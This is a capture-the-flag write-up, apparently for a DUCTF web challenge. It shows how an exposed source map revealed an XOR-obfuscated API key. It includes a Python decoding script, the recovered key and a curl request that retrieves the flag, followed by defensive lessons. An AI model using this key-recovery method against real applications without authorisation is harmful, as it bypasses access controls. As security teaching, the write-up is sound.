## 📄 Writeup: Source Map Leakage — Client-Side Key Recovery

**Challenge:**
*“The app looks scrambled and full of brainrot! But there’s more than meets the eye. Dive into the code, connect the dots, and see if you can uncover what’s really going on behind the scenes, or right at the front!”*

---

### 🔍 Target Application Overview

The application was a Flask-based web app with a hidden **/admin/flag** endpoint requiring an **X-API-Key** header containing a secret key to retrieve the flag.

Direct analysis of the server code revealed:

```python
key = request.headers.get("X-API-Key")
if key == API_SECRET_KEY:
    return FLAG
return "Unauthorized", 403
```

The **API\_SECRET\_KEY** was loaded from a hidden `.env` file (unavailable externally). No direct leaks were visible.

---

### 🔓 Discovery of Vulnerability

During static analysis of **main.min.js**, a critical developer comment was found:

```js
//test map file -> test-main.min.js.map, remove in prod
```

Accessing:

```
https://<target>/static/js/test-main.min.js.map
```

returned a **source map** file publicly accessible.

This map file revealed deobfuscated client-side JavaScript source code, including a function containing XOR-obfuscated static data — likely used to compute the API key.

---

### 📖 Code Analysis

The recovered function:

```js
function qyrbkc() {
    const dhgyvu = [...];
    const lmsvdt = dhgyvu.map((val, index) => String.fromCharCode(Number(val) ^ (index + 1) ^ 0)).reduce((a, b) => a + b, "");
    console.log("Note: Key is now secured with heavy obfuscation, should be safe to use in prod :)");
}
```

This was a client-side **API key derivation mechanism** using XOR per character with the index.

---

### 🛠️ Solution

A simple Python script reversed the key derivation:

```python
codes = [85, 87, 77, 67, 40, 82, 82, 70, 78, 39, 95, 89,
         67, 73, 34, 68, 68, 92, 84, 57, 70, 87, 95, 77, 75]

key = ''.join(chr(code ^ (index + 1)) for index, code in enumerate(codes))

print(key)
```

Result:

```
TUNG-TUNG-TUNG-TUNG-SAHUR
```

---

### 📬 Exploitation

Using the recovered key:

```bash
curl -X POST https://<target>/admin/flag \
     -H "X-API-Key: TUNG-TUNG-TUNG-TUNG-SAHUR"
```

Response:

```
DUCTF{FLAG}
```

---

### 📊 Key Lessons

* **Source maps** must never be deployed to production environments.
* Obfuscation in client-side code offers no real security.
* Sensitive logic (such as API keys or secret derivation) must reside exclusively server-side.
* Always audit deployed assets for accidental leaks.

---

**Category:** Web Exploitation / Client-Side Reverse Engineering
**Technique Used:** Source Map Leakage → Static Code Recovery → API Key Extraction
**Difficulty:** Easy-Medium
